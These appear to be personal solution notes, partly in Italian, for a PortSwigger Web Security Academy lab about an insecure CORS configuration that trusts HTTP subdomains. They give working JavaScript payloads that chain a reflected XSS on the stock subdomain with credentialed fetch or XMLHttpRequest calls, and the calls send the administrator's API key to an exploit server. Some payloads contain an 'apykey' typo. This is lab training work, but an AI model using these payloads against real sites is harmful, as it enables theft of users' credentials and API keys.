
https://portswigger.net/web-security/cors/lab-breaking-https-attack


This website has an insecure CORS configuration in that it trusts all subdomains regardless of the protocol.

To solve the lab, craft some JavaScript that uses CORS to retrieve the administrator's API key and upload the code to your exploit server. The lab is solved when you successfully submit the administrator's API key.

You can log in to your own account using the following credentials: wiener:peter



1) on /accountDetails request we can see that there is Access-Control-Allow-Credentials: true so it uses CORS


2) try to insert in the request Origin: test.com and see that 
    it doesn't work 

    if we try to use http://test.com it doesn't work

    if we try to use evil.lab-id.net it doesn't work

    BUT
    if we use http://evil.lab-id.web-security-academy.net it is reflected and allowed 

    so we need to perform a request with an origin that is a subdomain of lab-id.net

3) in stock functionality we can see that it opens a popup with this link:
    http://stock.0a9a00cf03b56d21813f775d001900a1.web-security-academy.net/?productId=1&storeId=1

    IT is a subdomain of lab-id.web-security-academy.net
    
    in addition we can inject a xss into the productId parameter
    example 
    http://stock.0a9a00cf03b56d21813f775d001900a1.web-security-academy.net/?productId=1<script>alert()</script>&storeId=1



3)  so we can write a script on exploit server that uses this XSS to perform a request to /accountDetails from stock.lab-id.web-security-academy.net

In exploit server we can use

<script>
    document.location ="http://stock.0a61002e04c2430f80f926d80099008a.web-security-academy.net/?productId=4<script>fetch('https://0a61002e04c2430f80f926d80099008a.web-security-academy.net/accountDetails', {credentials: 'include',}).then(response => {return response.json();}).then(data => {fetch('https://exploit-0a3b0015048443a2805225410127007d.exploit-server.net/?apikey='%2b data.apykey)});%3c/script>&storeId=1"
</script>

    the victim is redirected to the page with xss that performs a request to /accountDetails































questo funziona ma l'altro perchè no????
<script>
    document.location="http://stock.0a61002e04c2430f80f926d80099008a.web-security-academy.net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://0a61002e04c2430f80f926d80099008a.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://exploit-0a3b0015048443a2805225410127007d.exploit-server.net/log?key='%2b JSON.parse(this.responseText).apikey;};%3c/script>&storeId=1"
</script>





sarebbe:
<script>
    var req = new XMLHttpRequest(); 
    req.onload = reqListener; 
    req.open('get','https://0a61002e04c2430f80f926d80099008a.web-security-academy.net/accountDetails',true); 
    req.withCredentials = true;
    req.send();
    function reqListener() {
        location='https://exploit-0a3b0015048443a2805225410127007d.exploit-server.net/log?key=' + JSON.parse(this.responseText).apikey;
    };

</script>






PERCHE NON FUNZIONI MALEDETTO
PERCHè non viene processato dal browser lo script, bisogna che il browser veda la pagina e quindi serve document.location
<script>
    fetch("http://stock.0a61002e04c2430f80f926d80099008a.web-security-academy.net/?productId=4<script>fetch('https://0a61002e04c2430f80f926d80099008a.web-security-academy.net/accountDetails', {credentials: 'include',}).then(response => {return response.json();}).then(data => {fetch('https://exploit-0a3b0015048443a2805225410127007d.exploit-server.net/?apikey='%2b data)});%3c/script>&storeId=1");
</script>


sarebbe:
<script>
    fetch('https://0a61002e04c2430f80f926d80099008a.web-security-academy.net/accountDetails', {
        credentials: 'include',
    })
    .then(response => {return response.json();})
    .then(data => {fetch('https://exploit-0a3b0015048443a2805225410127007d.exploit-server.net/?apikey='+data.apikey)});
    
</script>









INFATTI QUESTO FUNZIONA con fetch
<script>
    document.location ="http://stock.0a61002e04c2430f80f926d80099008a.web-security-academy.net/?productId=4<script>fetch('https://0a61002e04c2430f80f926d80099008a.web-security-academy.net/accountDetails', {credentials: 'include',}).then(response => {return response.json();}).then(data => {fetch('https://exploit-0a3b0015048443a2805225410127007d.exploit-server.net/?apikey='%2b data.apykey)});%3c/script>&storeId=1"
</script>
